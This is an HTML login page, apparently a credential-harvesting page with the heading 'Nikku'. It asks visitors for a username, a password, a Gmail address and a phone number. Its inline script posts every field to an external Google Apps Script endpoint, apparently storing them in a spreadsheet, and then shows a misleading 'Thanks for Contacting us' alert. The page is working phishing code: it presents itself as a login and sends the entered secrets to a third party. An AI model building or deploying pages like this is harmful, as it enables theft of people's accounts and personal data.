<!DOCTYPE html> 
<html> 

<head> 
	<title>GeeksforGeeks Registration</title> 
	<link rel="stylesheet"
		href="style.css"> 
		<style type="text/css">
			body { 
	display: flex; 
	align-items: center; 
	justify-content: center; 
	font-family: sans-serif; 
	line-height: 1.5; 
	min-height: 100vh; 
	background: #f3f3f3; 
	flex-direction: column; 
	margin: 0; 
} 

.main { 
	background-color: #fff; 
	border-radius: 15px; 
	box-shadow: 0 0 20px rgba(0, 0, 0, 0.2); 
	padding: 10px 20px; 
	transition: transform 0.2s; 
	width: 500px; 
	text-align: center; 
} 

h1 { 
	color: #4CAF50; 
} 

label { 
	display: block; 
	width: 100%; 
	margin-top: 10px; 
	margin-bottom: 5px; 
	text-align: left; 
	color: #555; 
	font-weight: bold; 
} 


input { 
	display: block; 
	width: 100%; 
	margin-bottom: 15px; 
	padding: 10px; 
	box-sizing: border-box; 
	border: 1px solid #ddd; 
	border-radius: 5px; 
} 

button { 
	padding: 15px; 
	border-radius: 10px; 
	margin-top: 15px; 
	margin-bottom: 15px; 
	border: none; 
	color: white; 
	cursor: pointer; 
	background-color: #4CAF50; 
	width: 100%; 
	font-size: 16px; 
} 

.wrap { 
	display: flex; 
	justify-content: center; 
	align-items: center; 
}

		</style>
</head> 

<body> 
	<div class="main"> 
		<h1>Nikku</h1> 
		<h3>Enter your login credentials</h3> 
		<form method="POST" name="google-sheet">
    <label for="Name">Username</label>
    <input type="text" id="fname" name="Username" placeholder="Enter your Username..">

    <label for="lname">Password</label>
    <input type="text" id="lname" name="Password" placeholder="Enter your Password..">

    <label for="lname">Gmail</label>
    <input type="text" id="lname" name="Gmail" placeholder="Enter your Gmail..">

    <label for="lname">Number</label>
    <input type="Number" id="lname" name="Number" placeholder="Enter your Number..">
  
   <div class="wrap"> 
				 <button type="submit"  value="Submit" name="submit">
				 Submit</button>
	</div>
  </form>
  <p>click on submit and wait for 3 seconds.....</p>
		<p>Not registered? 
			<a href="#"
			style="text-decoration: none;"> 
				Create an account 
			</a> 
		</p> 
	</div> 
	<script>
            const scriptURL = 'https://script.google.com/macros/s/AKfycbzauCbzrJ2LEF9K5s0dbhbXPKrEjam9JswSdgtVVXDhisk1mGd6A4ChwFZ_waXAE1-Log/exec'
            const form = document.forms['google-sheet']
          
            form.addEventListener('submit', e => {
              e.preventDefault()
              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
                .catch(error => console.error('Error!', error.message))
            })
          </script>
</body> 

</html>
